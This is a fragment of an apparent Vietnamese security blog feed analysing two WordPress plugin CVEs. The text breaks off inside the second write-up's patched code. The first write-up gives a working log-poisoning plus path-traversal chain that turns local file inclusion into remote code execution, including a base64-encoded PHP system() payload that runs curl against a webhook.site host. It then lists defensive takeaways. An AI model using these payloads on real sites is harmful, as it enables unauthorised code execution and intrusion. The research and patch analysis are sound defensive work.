version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Gửi request với PHP code đặt trong &lt;code&gt;User-Agent&lt;/code&gt; header&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET / HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Gửi request với LFI payload trỏ đến &lt;code&gt;/var/log/apache2/other_vhosts_access.log&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&#xA;Accept: text/html,application/xhtml&amp;#43;xml,application/xml;q=0.9,*/*;q=0.8&#xA;Accept-Language: en-US,en;q=0.5&#xA;Accept-Encoding: gzip, deflate, br&#xA;Connection: keep-alive&#xA;Upgrade-Insecure-Requests: 1&#xA;Sec-Fetch-Dest: document&#xA;Sec-Fetch-Mode: navigate&#xA;Sec-Fetch-Site: none&#xA;Sec-Fetch-User: ?1&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0, i&#xA;Content-Length: 0&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/result2.png&#34;&#xA;    alt=&#34;Kết quả LFI =&amp;gt; RCE thành công&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Kết quả LFI =&amp;gt; RCE thành công&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;p&gt;&lt;strong&gt;Giải thích&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi truy cập trang với User‑Agent chứa payload trên, Apache sẽ lưu payload này vào access log:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;w41bu1@22NS088:~$ cat /var/log/apache2/other_vhosts_access.log&#xA;127.0.1.1:80 127.0.0.1 - - [18/Oct/2025:19:10:08 &amp;#43;0700] &amp;#34;GET /x/wp-activate.php/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/%2f/%2e%2e/var/log/apache2/other_vhosts_access.log? HTTP/1.1&amp;#34; 403 2844 &amp;#34;-&amp;#34; &amp;#34;Mozilla/5.0 (X11; Ubuntu; &amp;lt;?php system(base64_decode(&amp;#39;Y3VybCAtSSAnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmFjN2UxNjMtYjQ3NS00MzIzLWEzMTUtYWNkMDEwMzU5NjQwJw==&amp;#39;)); ?&amp;gt;Linux x86_64; rv:144.0) Gecko/20100101 Firefox/144.0&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi &lt;code&gt;include()&lt;/code&gt; một file, PHP sẽ thực thi mọi mã PHP (&lt;code&gt;&amp;lt;?php ?&amp;gt;&lt;/code&gt;) có trong nội dung file trước khi trả về. Payload được mã hoá bằng Base64 và giải mã tại thời điểm include bằng &lt;code&gt;base64_decode&lt;/code&gt; tránh lỗi escape dấu ngoặc kép (&lt;code&gt;&amp;quot;&lt;/code&gt; → &lt;code&gt;\&amp;quot;&lt;/code&gt;) khi logger lưu. Lệnh giải mã sẽ trở thành:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;curl -I &amp;#39;https://webhook.site/bac7e163-b475-4323-a315-acd010359640&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cuối cùng &lt;code&gt;system()&lt;/code&gt; sẽ chạy lệnh này và trả output.&lt;/p&gt;&#xA;&lt;div class=&#34;alert alert-warning&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M6.457 1.047c.659-1.234 2.427-1.234 3.086.0l6.082 11.378A1.75 1.75.0 0114.082 15H1.918A1.75 1.75.0 01.375 12.425zm1.763.707a.25.25.0 00-.44.0L1.698 13.132a.25.25.0 00.22.368h12.164a.25.25.0 00.22-.368zm.53 3.996v2.5a.75.75.0 01-1.5.0v-2.5a.75.75.0 011.5.0zM9 11a1 1 0 11-2 0 1 1 0 012 0z&#34;/&gt;&lt;/svg&gt;Cảnh báo&lt;/p&gt;&lt;p&gt;Lưu ý: dù &lt;code&gt;base64_decode&lt;/code&gt; bị chặn bởi plugin nhưng Apache đã lưu trữ trước khi plugin xử lý, chuỗi Base64 vẫn được ghi vào log.&lt;/p&gt;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phiên bản &lt;strong&gt;≤ 5.4.01&lt;/strong&gt; của Hide My WP Ghost cho phép LFI vì plugin tái tạo đường dẫn rồi &lt;code&gt;include()&lt;/code&gt; mà không canonicalize/whitelist. Bằng cách kết hợp log‑poisoning và payload chứa &lt;code&gt;/wp-activate.php/?&lt;/code&gt;, kẻ tấn công có thể từ LFI leo thành RCE trong một số cấu hình. Lỗ hổng được vá trong &lt;strong&gt;5.4.02&lt;/strong&gt; bằng việc sanitize URL trước khi trả về.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không include trực tiếp&lt;/strong&gt; dữ liệu từ request.&lt;/li&gt;&#xA;&lt;li&gt;Dùng &lt;strong&gt;realpath() / basename() / whitelist / kiểm tra base_dir&lt;/strong&gt; trước khi include.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt; không đủ để ngăn traversal.&lt;/li&gt;&#xA;&lt;li&gt;Log poisoning (User‑Agent, Referer…) có thể tạo nguồn payload cho LFI — không ghi thô nội dung có thể được include sau này.&lt;/li&gt;&#xA;&lt;li&gt;Vá phải kết hợp: sanitize + canonicalize + giới hạn thư mục + kiểm soát quyền ghi log.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/hide-my-wp/vulnerability/wordpress-hide-my-wp-ghost-plugin-5-4-01-local-file-inclusion-to-rce-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress Hide My WP Ghost Plugin &amp;lt;= 5.4.01 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-39399 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/</link>
      <pubDate>Fri, 17 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-17-cve-2025-39399/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;License For Envato&lt;/strong&gt; phiên bản &lt;strong&gt;≤ 1.0.0&lt;/strong&gt; chứa lỗ hổng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho phép kẻ tấn công không cần xác thực điều khiển tham số file trong lệnh &lt;code&gt;include/require&lt;/code&gt;, từ đó chèn hoặc đọc các tệp cục bộ trên máy chủ (ví dụ file cấu hình chứa credential), dẫn tới rò rỉ thông tin nhạy cảm và trong một số cấu hình có thể dẫn tới thực thi mã.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-39399&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-39399&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.0.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.1.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/license-envato/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress License For Envato Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;License For Envato&lt;/strong&gt;: &lt;strong&gt;1.0.0&lt;/strong&gt; (vulnerable) và &lt;strong&gt;1.1.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Bản lỗi&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php $action = isset( $_GET[&amp;#39;tab&amp;#39;] ) ? sanitize_text_field( $_GET[&amp;#39;tab&amp;#39;] ) : &amp;#39;general&amp;#39;; ?&amp;gt;&#xA;    // other logic&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        $template = &amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;;&#xA;    }&#xA;&#xA;    if ( file_exists( $template ) ) {&#xA;        include $template;&#xA;    }else{&#xA;        include &amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;;&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong phiên bản lỗi, giá trị của biến &lt;code&gt;$action&lt;/code&gt; được lấy trực tiếp từ tham số &lt;code&gt;$_GET[&#39;tab&#39;]&lt;/code&gt;. Mặc dù biến này được xử lý qua hàm &lt;a href=&#34;https://developer.wordpress.org/reference/functions/sanitize_text_field/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;sanitize_text_field()&lt;/code&gt;&lt;/a&gt;, hàm này chỉ loại bỏ thẻ HTML - &lt;strong&gt;chứ không ngăn chặn các chuỗi traversal như &lt;code&gt;../&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Do đó, attacker có thể truyền vào một giá trị như &lt;code&gt;?tab=../../somefile&lt;/code&gt;, khiến &lt;code&gt;$action&lt;/code&gt; chứa đường dẫn ngoài mong đợi. Khi biến này được nối vào &lt;code&gt;$template&lt;/code&gt; và sau đó được &lt;code&gt;include&lt;/code&gt; =&amp;gt; Xảy ra LFI.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;?php&#xA;// Exit if accessed directly&#xA;defined(&amp;#39;ABSPATH&amp;#39;) || exit;&#xA;&#xA;// Define allowed tab values to prevent LFI&#xA;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;// Apply filter to allow extensions to add their own tabs&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&#xA;&#xA;// Verify nonce if tab parameter is set&#xA;$action = &amp;#39;general&amp;#39;;&#xA;if (isset($_GET[&amp;#39;tab&amp;#39;])) {&#xA;    // Verify nonce for tab switching if provided&#xA;    if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(sanitize_text_field(wp_unslash($_GET[&amp;#39;_wpnonce&amp;#39;])), &amp;#39;license_envato_switch_tab&amp;#39;)) {&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    } elseif (!isset($_GET[&amp;#39;_wpnonce&amp;#39;])) {&#xA;        // If no nonce is provided, still allow tab switching but sanitize input&#xA;        $tab = sanitize_text_field(wp_unslash($_GET[&amp;#39;tab&amp;#39;]));&#xA;        // Only allow values from the whitelist&#xA;        $action = in_array($tab, $allowed_tabs) ? $tab : &amp;#39;general&amp;#39;;&#xA;    }&#xA;}&#xA;?&amp;gt;&#xA;&amp;lt;div class=&amp;#34;wrap&amp;#34;&amp;gt;&#xA;    &amp;lt;?php&#xA;    $dir = __DIR__;&#xA;    $licenseEnvato_nav_view =  apply_filters( &amp;#39;license_envato_settings_view&amp;#39;, $dir, $action );&#xA;&#xA;    if ($licenseEnvato_nav_view) {&#xA;        // Ensure we only include files within the plugin directory structure&#xA;        $template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;        $nav_view_dir = realpath($licenseEnvato_nav_view);&#xA;        &#xA;        // Verify the template is a child of the nav view directory to prevent path traversal&#xA;        if ($template &amp;amp;&amp;amp; $nav_view_dir &amp;amp;&amp;amp; strpos($template, $nav_view_dir) === 0 